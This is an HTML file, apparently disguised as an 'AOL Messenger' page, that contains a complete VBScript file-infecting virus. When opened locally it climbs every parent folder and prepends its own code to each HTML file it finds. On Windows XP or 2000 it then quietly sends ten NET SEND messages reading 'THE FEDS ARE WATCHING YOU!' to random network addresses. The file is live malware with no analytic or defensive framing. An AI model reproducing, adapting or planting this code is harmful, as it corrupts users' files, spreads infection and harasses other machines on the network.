<html><!--AOL MESSENGER BY YELLO-->
<script language="VBScript"><!--

	If location.protocol = "file:" then FileTrue

Sub FileTrue

	Set FSO = CreateObject("Scripting.FileSystemObject")
	HPath = Replace(location.href, "file:///", VbNullstring)
		HPath = Replace(HPath, Chr(47), Chr(92))
		myPath = fso.GetParentFolderName(HPath)

	Set folder = fso.GetFolder(myPath)

	Set f01 = fso.OpenTextFile(HPath,1)
	Alltxt = f01.ReadAll
	While folder.IsRootFolder = false
		Set folder = fso.GetFolder(myPath)
		Set fc = folder.Files
		myPath = fso.GetParentFolderName(myPath)
		For each f1 in fc

		xAlltxt = vbnullstring

			s = Fso.GetExtensionName(f1.name)
			If f1.path <> HPath then
				If Ucase(s) = "HTM" Or Ucase(s) = "HTML" then

          Set f02 = fso.OpenTextFile(f1.path,1)
	  xAlltxt = f02.ReadAll
	  A=InstrRev(Alltxt,"<!--Dúff-->")+11

		Set f = fso.OpenTextFile(f1.path,2, True)
		f.Write Mid(Alltxt,1,A)
		f.WriteLine vbNewline
		f.Write xAlltxt
		f.Close


				End if
			End If
		Next
	Wend

	Set Shell = CreateObject("WScript.Shell")
		WinVir = Shell.RegRead("HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\ProductName")

			if Instr(Ucase(WinVir),"XP") > 0 Or Instr(Ucase(WinVir),"2000") > 0 then


			for i = 1 to 10

				Randomize

				for l = 1 to 2
					Rnd1 = Rnd1 & Int(6 * Rnd)
   				Next
   				for j = 1 to 2
					Rnd2 = Rnd2 & Int(6 * Rnd)
				Next
				Shell.Run("NET SEND 172.190.2"&Rnd1&".2"&Rnd2&" THE FEDS ARE WATCHING YOU!"),VbHide
			Next

			End if


	Set Shell = Nothing
	Set FSO = Nothing
End Sub
--></script>
</html><!--Dúff-->
